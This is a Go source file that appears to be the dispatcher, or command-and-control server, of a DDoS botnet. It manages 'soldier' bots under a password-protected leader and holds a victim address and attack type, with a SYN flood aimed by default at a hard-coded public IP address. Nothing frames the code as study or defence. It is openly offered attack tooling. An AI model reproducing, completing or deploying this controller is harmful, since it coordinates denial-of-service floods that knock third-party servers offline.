package dispatcher

import (
	"crypto/md5"
	"encoding/hex"
	"sync"
	"time"
)

type Dispatcher struct {
	ListeningAddress string
	ListeningPort    string

	Cmp Camp
}

var instance *Dispatcher
var Once sync.Once

func NewDispatcher() *Dispatcher {
	Once.Do(func() {
		instance = &Dispatcher{}
	})
	return instance
}

func HashOf(password string) string {
	hashes := md5.New()
	hashes.Write([]byte(password))
	return hex.EncodeToString(hashes.Sum(nil))
}

func (d *Dispatcher) SetupDefault() {
	d.ListeningAddress = "127.0.0.1"
	d.ListeningPort = "8080"
	d.Cmp.Leader.Name = "leader"
	d.Cmp.Leader.AuthenticationHash = HashOf("password")
	d.Cmp.Settings.Status = StatusStopped
	d.Cmp.Settings.VictimServer = "142.251.37.174:80"
	d.Cmp.Settings.DDOSType = DDOSTypeSYN
	d.Cmp.Soldiers = make([]Soldier, 0)
}

func (d *Dispatcher) Setup(address, port, name, password, victim, ddosType string) {
	d.ListeningAddress = address
	d.ListeningPort = port
	d.Cmp.Leader.Name = name
	d.Cmp.Leader.AuthenticationHash = HashOf(password)
	d.Cmp.Settings.Status = StatusStopped
	d.Cmp.Settings.VictimServer = victim
	d.Cmp.Settings.DDOSType = ddosType
	d.Cmp.Soldiers = make([]Soldier, 0)
}

func (c *Camp) UpdateSettings(status, victim, ddosType string) {
	if status != "" {
		c.Settings.Status = status
	}
	if victim != "" {
		c.Settings.VictimServer = victim
	}
	if ddosType != "" {
		c.Settings.DDOSType = ddosType
	}
}
func (d *Dispatcher) ScanAndRemoveTimeOutSoldiers() {
	c := &d.Cmp
	for i, soldier := range c.Soldiers {
		if soldier.LastRequest.IsZero() {
			continue
		}
		if time.Now().Sub(soldier.LastRequest) > time.Second*5 {
			c.Soldiers = append(c.Soldiers[:i], c.Soldiers[i+1:]...)
		}
	}

}

func (d *Dispatcher) Checker() {
	for {
		d.ScanAndRemoveTimeOutSoldiers()
		time.Sleep(time.Second * 3)
	}
}
